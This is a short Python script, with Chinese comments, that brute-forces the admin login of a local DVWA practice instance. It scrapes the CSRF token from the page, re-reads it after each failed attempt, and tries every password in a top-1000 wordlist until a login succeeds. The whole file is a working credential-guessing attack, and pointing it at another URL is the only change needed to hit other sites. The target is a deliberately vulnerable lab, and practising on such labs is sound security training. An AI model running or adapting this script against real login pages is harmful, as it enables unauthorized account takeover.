#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2023/7/4 10:45
# @Author  : gucb
# @PROJECT_UUID: c76f2b9eb99440709152633c3924ada6


import datetime
import requests
from bs4 import BeautifulSoup


# 爆破DVWA登录页面


def Login_brute(filename):
    # 第一步，获取网页的csrf_token
    url = 'http://127.0.0.1:28080/login.php'
    # 用于会话保持
    s = requests.Session()
    req = s.get(url)
    # 设置UA头
    heads = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'}
    # 设置请求的编码
    req.encoding = 'UTF-8'
    html = req.text
    # print(html)
    soup_texts = BeautifulSoup(html, 'html.parser')
    # 获取csrf_token
    csrf_token = soup_texts.find('input', {'name': 'user_token'}).get('value')
    # 读取本地文件，获取爆破密码
    with open(filename, 'r') as p:
        for password in p.readlines():
            # 去除字符串2端的空格
            password = password.strip()
            # 用于提交的数据
            data = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
            # 创建请求
            req = s.post(url=url, headers=heads, data=data)
            # 对请求进行编码
            req.encoding = 'UTF-8'
            html = req.text
            # 登陆成功判断
            if 'Login failed' in html:
                soup_texts = BeautifulSoup(html, 'html.parser')
                csrf_token = soup_texts.find('input', {'name': 'user_token'}).get('value')
                print("用户名:admin,密码:{}登录失败".format(password))
            else:
                print("----------------> 用户名:admin,密码:{}登录成功".format(password))
                break




if __name__ == '__main__':
    starttime = datetime.datetime.now()
    print("show time")
    Login_brute("../data/top1000_passwords.txt")
    endtime = datetime.datetime.now()
    # 记录爆破用时
    print("时间：", (endtime - starttime).seconds)
